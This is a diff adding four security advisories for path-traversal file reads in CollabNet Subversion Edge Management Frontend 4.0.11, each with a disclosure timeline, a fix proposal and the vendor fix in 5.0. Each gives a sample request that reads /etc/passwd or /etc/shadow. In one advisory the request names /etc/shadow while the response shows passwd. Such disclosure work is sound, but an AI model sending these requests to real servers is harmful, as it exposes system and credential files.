@@ -1,0 +1,204 @@
+# Vuln Title: Local file inclusion in CollabNet Subversion Edge Management
+# Frontend via logfile "fileName" parameter of the "tail" action
+#
+# Date: 28.06.2015
+# Author: otr
+# Software Link: https://www.open.collab.net/downloads/svnedge
+# Vendor: CollabNet
+# Version: 4.0.11
+# Tested on: Fedora Linux
+# Type: Local file inclusion
+#
+# Risk: Medium
+# Status: public/fixed
+# Fixed version: 5.0
+
+Timeline:
+
+2014-10-09 Flaw Discovered
+2014-10-20 Vendor contacted
+2014-10-21 Vendor response
+2014-12-08 Vendor fix proposal
+2014-12-08 Extension of embargo to 19.4.2015
+2015-05-04 Extension of embargo until release of version 5.0
+2015-05-18 Release of version 5.0 and public disclosure
+
+Summary:
+
+The CollabNet Subversion Edge Management Frontend allows authenticated admins to
+read arbitrary local files via logfile "fileName" parameter of the "tail" action
+
+Vulnerability:
+
+  Sample URL:
+    https://example.com:4434/csvn/log/tail?fileName=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&startIndex=0
+
+Fix proposal:
+
+Remove feature or santizes the fileName parameter so that no path traversals and
+arbitrary file inclusions are possible.
+
+Vendor fix:
+
+[...] now allow only showing hooks/logs within the intended directories.
+
+####################################################################
+
+# Vuln Title: Local file inclusion in CollabNet Subversion Edge Management
+# Frontend via logfile "listViewItem" parameter of the "index" action
+#
+# Date: 28.06.2015
+# Author: otr
+# Software Link: https://www.open.collab.net/downloads/svnedge
+# Vendor: CollabNet
+# Version: 4.0.11
+# Tested on: Fedora Linux
+# Type: Local file inclusion
+#
+# Risk: Medium
+# Status: public/fixed
+# Fixed version: 5.0
+
+Timeline:
+
+2014-10-09 Flaw Discovered
+2014-10-20 Vendor contacted
+2014-10-21 Vendor response
+2014-12-08 Vendor fix proposal
+2014-12-08 Extension of embargo to 19.4.2015
+2015-05-04 Extension of embargo until release of version 5.0
+2015-05-18 Release of version 5.0 and public disclosure
+
+Summary:
+
+The CollabNet Subversion Edge Management Frontend allows authenticated admins to
+read arbitrary local files via logfile "listViewItem" parameter of the "index"
+action
+
+Vulnerability:
+
+  Request:
+    POST /csvn/repo/index HTTP/1.1
+    Host: example.com:4434
+    [...]
+
+    id=1&datatable_length=10&listViewItem_../../../../../../etc/passwd=on&_confirmDialogText_copyHook=&_confirmDialogText_renameHook=&_action_downloadHook=Download
+
+  Response:
+
+    HTTP/1.1 200 OK
+    Content-Type: text/plain
+    Content-disposition: attachment;filename="../../../../../../etc/passwd"
+    Content-Length: 1825
+
+    root:x:0:0:root:/root:/bin/bash
+
+Fix proposal:
+
+Remove feature or santizes the "listViewItem" parameter so that no path traversals and
+arbitrary file inclusions are possible.
+
+Vendor fix:
+
+[...] now allow only showing hooks/logs within the intended directories.
+
+####################################################################
+
+# Vuln Title: Local file inclusion in CollabNet Subversion Edge Management
+# Frontend via "fileName" parameter of the show action
+#
+# Date: 10.10.2014
+# Author: otr
+# Software Link: https://www.open.collab.net/downloads/svnedge
+# Vendor: CollabNet
+# Version: 4.0.11
+# Tested on: Fedora Linux
+# Type: Local file inclusion
+#
+# Risk: Medium
+# Status: public/fixed
+# Fixed version: 5.0
+
+Timeline:
+
+2014-10-09 Flaw Discovered
+2014-10-20 Vendor contacted
+2014-10-21 Vendor response
+2014-12-08 Vendor fix proposal
+2014-12-08 Extension of embargo to 19.4.2015
+2015-05-04 Extension of embargo until release of version 5.0
+2015-05-18 Release of version 5.0 and public disclosure
+
+Summary:
+
+The CollabNet Subversion Edge Management Frontend allows authenticated admins to
+read arbitrary local files via logfile "fileName" parameter of the show action
+
+Vulnerability:
+
+  Request:
+    GET /csvn/log/show?fileName=../../../../../../etc/shadow HTTP/1.1
+    Host: example.com:4434
+
+  Response:
+    HTTP/1.1 200 OK
+    [...]
+    <div class="span3">../../../../../../etc/passwd</div>
+    [...]
+    root:x:0:0:root:/root:/bin/bash
+
+Fix proposal:
+
+Remove feature or santizes the fileName parameter so that no path traversals and
+arbitrary file inclusions are possible.
+
+Vendor fix:
+
+[...] now allow only showing hooks/logs within the intended directories.
+
+####################################################################
+
+# Vuln Title: Local file inclusion in CollabNet Subversion Edge Management
+# Frontend via logfile "filename" parameter of the "downloadHook" action
+#
+# Date: 28.06.2015
+# Author: otr
+# Software Link: https://www.open.collab.net/downloads/svnedge
+# Vendor: CollabNet
+# Version: 4.0.11
+# Tested on: Fedora Linux
+# Type: Local file inclusion
+#
+# Risk: Medium
+# Status: public/fixed
+# Fixed version: 5.0
+
+Timeline:
+
+2014-10-09 Flaw Discovered
+2014-10-20 Vendor contacted
+2014-10-21 Vendor response
+2014-12-08 Vendor fix proposal
+2014-12-08 Extension of embargo to 19.4.2015
+2015-05-04 Extension of embargo until release of version 5.0
+2015-05-18 Release of version 5.0 and public disclosure
+
+Summary:
+
+The CollabNet Subversion Edge Management Frontend allows authenticated admins to
+read arbitrary local files via logfile "filename" parameter of the
+"downloadHook" action
+
+Vulnerability:
+
+  Example URL:
+    https://example.com:4434/csvn/repo/downloadHook/1?filename=../../../../../../etc/passwd
+
+Fix proposal:
+
+Remove feature or santizes the "filename" parameter so that no path traversals
+and arbitrary file inclusions are possible.
+
+Vendor fix:
+
+[...] now allow only showing hooks/logs within the intended directories.
